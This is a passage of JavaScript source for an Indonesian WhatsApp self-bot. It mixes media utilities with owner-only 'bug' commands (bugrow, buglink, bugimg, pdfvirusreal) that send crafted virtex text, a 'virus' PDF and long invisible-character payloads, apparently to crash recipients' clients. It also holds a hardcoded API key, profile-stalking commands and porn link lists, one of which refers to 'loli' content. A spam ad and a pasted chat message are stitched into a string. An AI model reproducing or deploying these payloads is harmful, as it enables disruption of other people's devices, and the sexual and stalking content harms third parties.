 } ,filename:`${virtexbykurzxd} ${virtex6(prefix)} .${virtexbykurzxd} ${virtexbykurzxd}`, mimetype: 'application/txt'})
break
case 'pdfvirusreal':
         if (!kurz.key.fromMe && !isOwner) return
virus = fs.readFileSync('./src/viruspdf.pdf')
kurzxd.sendMessage(from, virus, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } , mimetype: 'application/txt'})
break
case 'bugrow':
if (!isOwner && !kurz.key.fromMe) return reply(mess.only.ownerB)
kurzxd.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'BUG ROW',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
kurzxd.sendMessage(from, listMsg, MessageType.listMessage, {quoted:kurz})
kurzxd.toggleDisappearingMessages(from, 0)
break
case 'buglink':
                if (!kurz.key.fromMe && !isOwner) return reply('Khusus Owner !!')
                 kurzxd.toggleDisappearingMessages(from, 0)
              kurzxd.sendMessage(from, virtex2(prefix), text, { quoted:kurz, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./media/virgam3.jpeg`),
                "sourceUrl": "https://youtu.be/7zgPEu1F_NA"}}})
                break         
                case 'infoall': case 'tagall':
                if (!kurz.key.fromMe) return reply('Lu siapa')
if (!kurz.key.fromMe & !isOwner) return reply(mess.only.admin)
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = kurz.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*Info :  ${q}*\n\n*Total Member :* ${groupMembers.length} \n\n┏━ *「 ${namaowner} 」* `+teks+`┗━ *「 ${namaowner} 」* `, members_id, false)
break
			  case 'ytsearch':
			  case 'yts':
			  if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await kurzxd.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
			 case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await kurzxd.sendMessage(from,li,image,{quoted: kurz})
            break
            case 'pinterest':
        
            if(!q) return reply('gambar apa?')
            reply('Lagi proses')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await kurzxd.sendMessage(from,di,image,{quoted: kurz})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *kurz* : ${i.kurzeloper}
- *Link kurz* : ${i.link_kurz}\n❉─────────────────────❉`
            }
            reply(store)
            break
             case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			kurzxd.sendMessage(from, teks, text,{quoted:kurz,detectLinks: false})                        
            })              
			break
case 'modecittugas':
			if (args.length < 1) return reply('Pertanyaan apa ?????')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '變______________變'
			for (let Y of res.data) {
			teks += `\n*「 TUKANG CIT V1 」*\n\n*𖣂 Jawaban:* ${Y.jawaban[0].text}\n變______________變'\n`
			}
			kurzxd.sendMessage(from, teks, text,{quoted:fvn,detectLinks: false})      
kurzxd.sendMessage(from, 'Dah tuh:V\nBy  | yt:kurzxdbotz', text, {quote: fvn})                  
            })              
			break
			    case 'igstalk':
            if (!q) return reply('Usernamenya?')
            if (body.includes("@")) return reply('gausah make @')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Following* : ${Y.followers}\n*Followers* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break   
            case 'githubstalk':
				reply('Sabar...')
				get_result = await fetchJson(`https://janbot-api.herokuapp.com/api/stalk/github?username=${body.slice(13)}`)
				get_result = get_result.result
				get_result1 = `Name : ${get_result.name}\n
Post : ${get_result.public_repos}\n
Followers : ${get_result.followers}\n
Following : ${get_result.following}\n
Bio : ${get_result.bio}\n
Location : ${get_result.location}\n
Link : ${get_result.html_url}\n`
				buff = await getBuffer(get_result.avatar_url)
				kurzxd.sendMessage(from, buff, image, {quoted: kurz, caption: get_result1})
				break
				case 'bugdisw':
				  if (!kurz.key.fromMe && !isOwner) return reply('Lu siapa?')
					buffer = fs.readFileSync(`./src/logo.jpg`)
					kurzxd.sendMessage('status@broadcast', buffer, image, { thumbnail : fs.readFileSync('./logo.jpg')
					})
					setTimeout( () => {
					kurzxd.sendMessage('status@broadcast', `UWES`, MessageType.extendedText)
					reply('UWES')
					}, 3000)
					break
			  case 'tomp3':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kurzxd.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: kurz })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kurzxd.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: kurz })
            fs.unlinkSync(ran)
            })
            break
case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									var imgbb = require('imgbb-uploader')
									if (isQuotedAudio) {
										ger = JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										reply(mess.wait)
										owgi = await kurzxd.downloadAndSaveMediaMessage(ger)
										Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
										teks=`─ 「 *AUDIO TO URL* 」 ─

*🔖 Url : ${Okelor.display_url}*`
										reply(teks)
 
										} else if (isQuotedImage) {
											ger = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
											reply(mess.wait)
											owgi = await kurzxd.downloadAndSaveMediaMessage(ger)
											qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
											teks=`─ 「 *IMAGE TO URL* 」 ─

*🔖Url : ${qbc.display_url}*`
											reply(teks)
											} else if (isQuotedVideo) {
												ger = isQuotedVideo ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
												reply(mess.wait)
												owgi = await kurzxd.downloadAndSaveMediaMessage(ger)
												ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
												teks=`─ 「 *VIDEO TO URL* 」 ─

*🔖 Url : ${ffff.display_url}*`
												reply(teks)
												} else if (isQuotedSticker) {
													ger = JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
													reply(mess.wait)
													owgi = await kurzxd.downloadAndSaveMediaMessage(ger)
													vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
													teks=`─ 「 *STICKER TO URL* 」 ─

*🔖 Url : ${vrr.display_url}*`
													reply(teks)
												}
											break
    case 'slow':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kurzxd.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: kurz })
            fs.unlinkSync(ran)
            })
            break
            case 'pastebin':
if(!q) return reply(`Contoh : NGINTIL`)
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   kurzxd.sendMessage(from, `${anu.result}`, text, {quoted: kurz})
                     break
                     case 'reverse':
            if (!isQuotedVideo) return reply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kurzxd.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: kurz })
            fs.unlinkSync(ran)
            })
            break
			  case 'linkbok3p':
			  
                 break
                 case 'nekopoi1':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi2':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi3':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi4':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi5':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi6':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi7':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi8':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Hikurzishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi9':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                kurzxd.sendMessage(from, fcrew, MessageType.image, {quoted: kurz, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'kodenuklir':
			     try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
				var kodenuk = `Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
Note : Easy mode = Sange, Biasa Aja, Mental Lemah :v
==============================
Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
Kode nuklir dr milf oneesan ampe gan***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/I am using the coolest phone keyboard I've ever used!😍👍 Get it now!👉http://dl5.fancykeyapp.com 
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
[8/6 10.48] +62 812-8025-1698: Happy Mother's Day 165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah

Random
 257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`
				kurzxd.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${namaowner} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuk, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
			  case 'link1':
			  kurzxd.sendMessage(from, link1(prefix), text)
			  break
			  case 'link2':
			  kurzxd.sendMessage(from, link2(prefix), text)
			  break
			  case 'link3':
			  kurzxd.sendMessage(from, link3(prefix), text)
					 break
					 case 'bugimg':
await kurzxd.toggleDisappearingMessages(from)
wew = fs.readFileSync(`./hm/virgam.jpeg`)
lzain = `
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏